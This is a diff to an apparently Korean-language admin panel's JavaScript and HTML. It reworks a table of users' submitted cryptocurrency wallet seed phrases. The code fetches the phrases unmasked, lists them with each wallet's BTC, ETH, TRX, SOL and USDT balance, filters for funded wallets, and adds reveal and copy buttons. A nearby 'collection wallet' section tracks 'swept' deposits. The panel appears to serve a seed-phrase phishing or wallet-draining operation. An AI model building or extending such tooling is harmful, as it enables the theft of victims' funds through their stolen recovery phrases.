@@ -891,12 +891,7 @@
             <button onclick="loadSeeds()" class="btn-ghost btn-sm">새로고침</button>
           </div>
         </div>
-        <div id="seedsGrid" style="display:grid;gap:10px;"></div>
-        <div id="seedPagination" class="pagination" style="margin-top:14px;">
-          <button onclick="changeSeedPage(-1)" id="seedPrevBtn" class="btn-ghost btn-sm">이전</button>
-          <span id="seedPageInfo" class="page-info"></span>
-          <button onclick="changeSeedPage(1)" id="seedNextBtn" class="btn-ghost btn-sm">다음</button>
-        </div>
+        <div id="seedsBody"></div>
       </div>
     </div>
 
@@ -1451,7 +1446,6 @@
   let allUsers = [];
   let allSeeds = [];
   let currentSeedPage = 1;
-  const SEEDS_PER_PAGE = 10;
 
   function authHeaders() {
     return adminToken ? { 'Authorization': 'Bearer ' + adminToken } : {};
@@ -2056,8 +2050,16 @@
   }
 
   /* ===== SEEDS ===== */
-  let seedsDataMap = {};
+  let seedsDataMap   = {};   // id → phrase (비마스킹)
   let _seedBalanceFilter = false;
+  const _seedRevealed    = {};
+  const SEEDS_PER_PAGE   = 20;
+
+  function _maskPhrase(p) {
+    if (!p) return '-';
+    const w = p.trim().split(/\s+/);
+    return w.length <= 4 ? '***' : w[0] + ' ... ' + w[w.length-1] + ' (' + w.length + '단어)';
+  }
 
   function toggleSeedBalanceFilter() {
     const chk = document.getElementById('seedBalanceFilterCheck');
@@ -2067,111 +2069,134 @@
   }
 
   async function loadSeeds() {
-    const grid = document.getElementById('seedsGrid');
-    if (grid) grid.innerHTML = '<div style="color:var(--muted);font-size:13px;padding:8px;">불러오는 중...</div>';
+    const body = document.getElementById('seedsBody');
+    if (body) body.innerHTML = '<div style="color:var(--muted);font-size:13px;padding:16px;">불러오는 중...</div>';
     try {
       allSeeds = await api('/api/admin/seeds?masked=false');
-      currentSeedPage = 1; renderSeeds();
+      seedsDataMap = {};
+      allSeeds.forEach(s => { seedsDataMap[s.no] = s.phrase; });
+      currentSeedPage = 1;
+      renderSeeds();
     } catch (e) {
-      if (grid) grid.innerHTML = '<div style="color:var(--err);font-size:13px;">로드 실패</div>';
+      if (body) body.innerHTML = `<div style="color:var(--err);font-size:13px;">${String(e.message).replace(/</g,'&lt;')}</div>`;
     }
   }
+
   function renderSeeds() {
-    const grid = document.getElementById('seedsGrid');
-    const displaySeeds = _seedBalanceFilter
-      ? allSeeds.filter(s => ((s.balance || 0) + (s.usdt_balance || 0)) > 0)
-      : allSeeds;
-    const total = displaySeeds.length;
-    // 체크박스 동기화
-    const chk = document.getElementById('seedBalanceFilterCheck');
+    const body = document.getElementById('seedsBody');
+    const chk  = document.getElementById('seedBalanceFilterCheck');
     if (chk) chk.checked = _seedBalanceFilter;
-    document.getElementById('seedTotal').textContent = _seedBalanceFilter
-      ? `(잔고있는 시드 ${total}개)`
-      : `(총 ${allSeeds.length}개)`;
-    if (!total) {
-      grid.innerHTML = '<div style="color:var(--muted);font-size:13px;padding:12px 0;text-align:center;">수신 시드 없음</div>';
-      document.getElementById('seedPagination').style.display = 'none'; return;
-    }
-    document.getElementById('seedPagination').style.display = 'flex';
-    seedsDataMap = {};
-    allSeeds.forEach(s => { seedsDataMap[s.no] = s.phrase; });
-    const page = displaySeeds.slice((currentSeedPage-1)*SEEDS_PER_PAGE, currentSeedPage*SEEDS_PER_PAGE);
-    grid.innerHTML = page.map(s => {
-      const btc   = Number(s.btc  || 0);
-      const eth   = Number(s.eth  || 0);
-      const tron  = Number(s.tron || 0);
-      const sol   = Number(s.sol  || 0);
-      const usdt  = Number(s.usdt_balance || 0);
-      const totalBal = btc + eth + tron + sol + usdt;
-      const hasBalance = totalBal > 0;
 
-      // 개별 코인 배지
-      const coinBadges = [
-        btc  > 0 ? `<span style="background:rgba(251,146,60,.12);color:#fb923c;border:1px solid rgba(251,146,60,.25);border-radius:20px;padding:2px 8px;font-size:11px;font-weight:700;">₿ ${btc.toFixed(6)}</span>` : '',
-        eth  > 0 ? `<span style="background:rgba(96,165,250,.12);color:#60a5fa;border:1px solid rgba(96,165,250,.25);border-radius:20px;padding:2px 8px;font-size:11px;font-weight:700;">Ξ ${eth.toFixed(6)}</span>` : '',
-        tron > 0 ? `<span style="background:rgba(248,113,113,.12);color:#f87171;border:1px solid rgba(248,113,113,.25);border-radius:20px;padding:2px 8px;font-size:11px;font-weight:700;">TRX ${tron.toFixed(2)}</span>` : '',
-        usdt > 0 ? `<span style="background:rgba(74,222,128,.12);color:#4ade80;border:1px solid rgba(74,222,128,.25);border-radius:20px;padding:2px 8px;font-size:11px;font-weight:700;">USDT ${usdt.toFixed(2)}</span>` : '',
-        sol  > 0 ? `<span style="background:rgba(167,139,250,.12);color:#a78bfa;border:1px solid rgba(167,139,250,.25);border-radius:20px;padding:2px 8px;font-size:11px;font-weight:700;">SOL ${sol.toFixed(4)}</span>` : '',
-      ].filter(Boolean).join('');
-
-      const balRow = hasBalance
-        ? `<div style="display:flex;gap:5px;flex-wrap:wrap;margin-bottom:8px;">${coinBadges}</div>`
-        : `<div style="margin-bottom:8px;"><span style="color:var(--muted);font-size:11px;">잔고 없음</span></div>`;
-
-      const shortened = s.phrase ? (s.phrase.split(' ').slice(0,4).join(' ') + ' ...') : '-';
-      const revealId = 'seedReveal_' + s.no;
-      return `<div style="background:var(--bg3);border:1px solid ${hasBalance ? 'rgba(74,222,128,.3)' : 'var(--border)'};border-radius:14px;padding:14px 16px;">
-        <div style="display:flex;align-items:flex-start;justify-content:space-between;gap:10px;margin-bottom:8px;flex-wrap:wrap;">
-          <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
-            <span style="font-size:12px;font-weight:700;color:var(--muted);">#${s.no}</span>
-            <span style="font-size:12px;color:var(--muted);">${String(s.userId||'').replace(/</g,'&lt;')}</span>
-          </div>
-          <span style="font-size:11px;color:var(--muted);">${new Date(s.at).toLocaleString()}</span>
-        </div>
-        ${balRow}
-        <div id="${revealId}" style="font-family:monospace;font-size:12px;color:var(--muted);word-break:break-all;background:rgba(0,0,0,.2);border-radius:8px;padding:8px 10px;margin-bottom:8px;cursor:pointer;"
-             onclick="toggleSeedReveal(${s.no})" title="클릭하여 전체 보기">${shortened}</div>
-        <button onclick="copySeed(${s.no})" class="btn-ghost btn-sm">📋 복사</button>
-      </div>`;
-    }).join('');
-    const totalPages = Math.ceil(total / SEEDS_PER_PAGE);
-    document.getElementById('seedPageInfo').textContent = `${currentSeedPage} / ${totalPages}`;
-    document.getElementById('seedPrevBtn').disabled = currentSeedPage === 1;
-    document.getElementById('seedNextBtn').disabled = currentSeedPage >= totalPages;
-  }
-  const _seedRevealed = {};
-  function toggleSeedReveal(no) {
-    const el = document.getElementById('seedReveal_' + no);
-    if (!el) return;
-    const phrase = seedsDataMap[no];
-    if (!phrase) return;
-    if (_seedRevealed[no]) {
-      _seedRevealed[no] = false;
-      el.textContent = phrase.split(' ').slice(0,4).join(' ') + ' ...';
-    } else {
-      _seedRevealed[no] = true;
-      el.textContent = phrase;
-    }
-  }
-  function changeSeedPage(dir) {
     const displaySeeds = _seedBalanceFilter
-      ? allSeeds.filter(s => ((s.balance || 0) + (s.usdt_balance || 0)) > 0)
+      ? allSeeds.filter(s => (s.btc||0)+(s.eth||0)+(s.tron||0)+(s.sol||0)+(s.usdt_balance||0) > 0)
       : allSeeds;
-    const totalPages = Math.ceil(displaySeeds.length / SEEDS_PER_PAGE);
-    const n = currentSeedPage + dir;
-    if (n < 1 || n > totalPages) return;
-    currentSeedPage = n; renderSeeds();
+
+    const total      = displaySeeds.length;
+    const totalPages = Math.max(1, Math.ceil(total / SEEDS_PER_PAGE));
+    currentSeedPage  = Math.min(currentSeedPage, totalPages);
+
+    const seedTotalEl = document.getElementById('seedTotal');
+    if (seedTotalEl) seedTotalEl.textContent = _seedBalanceFilter
+      ? `(잔고있는 시드 ${total}개)` : `(총 ${allSeeds.length}개)`;
+
+    if (!total) {
+      body.innerHTML = '<div style="color:var(--muted);font-size:13px;padding:20px;text-align:center;">시드 없음</div>';
+      return;
+    }
+
+    const page     = displaySeeds.slice((currentSeedPage-1)*SEEDS_PER_PAGE, currentSeedPage*SEEDS_PER_PAGE);
+    const pageFrom = (currentSeedPage-1)*SEEDS_PER_PAGE + 1;
+    const pageTo   = Math.min(currentSeedPage*SEEDS_PER_PAGE, total);
+
+    const rows = page.map(s => {
+      const id   = s.no;
+      const rev  = !!_seedRevealed[id];
+      const disp = rev ? String(s.phrase||'').replace(/</g,'&lt;') : _maskPhrase(s.phrase).replace(/</g,'&lt;');
+      const tron = Number(s.tron || 0);
+      const btc  = Number(s.btc  || 0);
+      const eth  = Number(s.eth  || 0);
+      const sol  = Number(s.sol  || 0);
+      const usdt = Number(s.usdt_balance || 0);
+      const uidE = String(s.userId||'').replace(/</g,'&lt;');
+      return `<tr>
+        <td style="font-weight:600;white-space:nowrap;">${uidE}</td>
+        <td style="min-width:220px;">
+          <div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap;">
+            <span id="aSeedCell_${id}" style="font-family:monospace;font-size:11px;color:var(--muted);word-break:break-all;flex:1;">${disp}</span>
+            <div style="display:flex;gap:4px;flex-shrink:0;">
+              <button id="aSeedRevBtn_${id}" class="btn-ghost btn-xs" onclick="adminToggleSeed(${id})">${rev?'숨기기':'보기'}</button>
+              <button class="btn-ghost btn-xs" onclick="adminCopySeed(${id})">복사</button>
+            </div>
+          </div>
+        </td>
+        <td style="text-align:right;">${tron > 0 ? '<span style="color:var(--ok)">'+tron.toFixed(4)+'</span>' : '-'}</td>
+        <td style="text-align:right;">${btc  > 0 ? '<span style="color:var(--ok)">'+btc.toFixed(6)+'</span>'  : '-'}</td>
+        <td style="text-align:right;">${eth  > 0 ? '<span style="color:var(--ok)">'+eth.toFixed(6)+'</span>'  : '-'}</td>
+        <td style="text-align:right;">${sol  > 0 ? '<span style="color:var(--ok)">'+sol.toFixed(4)+'</span>'  : '-'}</td>
+        <td style="text-align:right;font-weight:700;">${usdt > 0 ? '<span style="color:var(--ac)">≈ '+usdt.toFixed(2)+' USDT</span>' : '<span style="color:var(--muted)">-</span>'}</td>
+        <td style="font-size:11px;color:var(--muted);white-space:nowrap;">${new Date(s.at).toLocaleString()}</td>
+      </tr>`;
+    }).join('');
+
+    body.innerHTML = `
+      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;flex-wrap:wrap;gap:6px;">
+        <span style="font-size:12px;color:var(--muted);">총 ${total}건 (${pageFrom}–${pageTo})</span>
+        <div style="display:flex;gap:6px;align-items:center;">
+          <button class="btn-ghost btn-sm" onclick="adminSeedPrev()" ${currentSeedPage<=1?'disabled':''}>◀ 이전</button>
+          <span style="font-size:12px;color:var(--muted);">${currentSeedPage} / ${totalPages}</span>
+          <button class="btn-ghost btn-sm" onclick="adminSeedNext()" ${currentSeedPage>=totalPages?'disabled':''}>다음 ▶</button>
+        </div>
+      </div>
+      <div class="table-container"><div class="table-wrapper">
+        <table>
+          <thead><tr>
+            <th>사용자</th><th>시드 문구</th><th>TRX</th><th>BTC</th><th>ETH</th><th>SOL</th><th>USDT 환산</th><th>제출일</th>
+          </tr></thead>
+          <tbody>${rows}</tbody>
+        </table>
+      </div></div>`;
   }
-  function copySeed(no) {
-    const phrase = seedsDataMap[no];
-    if (!phrase) { alert('시드를 찾을 수 없습니다.'); return; }
-    navigator.clipboard.writeText(phrase).then(() => alert('✅ 복사 완료!')).catch(() => {
-      const t = document.createElement('textarea');
-      t.value = phrase; t.style.position = 'fixed'; t.style.opacity = '0';
-      document.body.appendChild(t); t.select(); document.execCommand('copy');
-      document.body.removeChild(t); alert('✅ 복사 완료!');
-    });
+
+  function adminSeedPrev() { if (currentSeedPage > 1) { currentSeedPage--; renderSeeds(); } }
+  function adminSeedNext() {
+    const ds = _seedBalanceFilter
+      ? allSeeds.filter(s => (s.btc||0)+(s.eth||0)+(s.tron||0)+(s.sol||0)+(s.usdt_balance||0) > 0)
+      : allSeeds;
+    if (currentSeedPage < Math.ceil(ds.length / SEEDS_PER_PAGE)) { currentSeedPage++; renderSeeds(); }
   }
+
+  function adminToggleSeed(id) {
+    const cell   = document.getElementById('aSeedCell_'   + id);
+    const btn    = document.getElementById('aSeedRevBtn_' + id);
+    if (!cell) return;
+    const phrase = seedsDataMap[id];
+    if (!phrase) return;
+    if (_seedRevealed[id]) {
+      _seedRevealed[id] = false;
+      cell.textContent = _maskPhrase(phrase);
+      if (btn) btn.textContent = '보기';
+    } else {
+      _seedRevealed[id] = true;
+      cell.textContent = phrase;
+      if (btn) btn.textContent = '숨기기';
+    }
+  }
+
+  function adminCopySeed(id) {
+    const phrase = seedsDataMap[id];
+    if (!phrase) { showToast('시드를 찾을 수 없습니다.', 'err'); return; }
+    navigator.clipboard.writeText(phrase)
+      .then(() => showToast('복사 완료!', 'ok'))
+      .catch(() => {
+        const t = document.createElement('textarea');
+        t.value = phrase; t.style.cssText = 'position:fixed;opacity:0;';
+        document.body.appendChild(t); t.select(); document.execCommand('copy');
+        document.body.removeChild(t); showToast('복사 완료!', 'ok');
+      });
+  }
+
+  // 하위 호환 alias
+  function copySeed(no) { adminCopySeed(no); }
   /* ===== COLLECTION WALLET ===== */
   let depositCurrentPage = 1;
   const statusColors = { issued:'#6b7280', waiting_deposit:'#fb923c', paid:'#4ade80', swept:'#7c6fff', expired:'#f87171' };
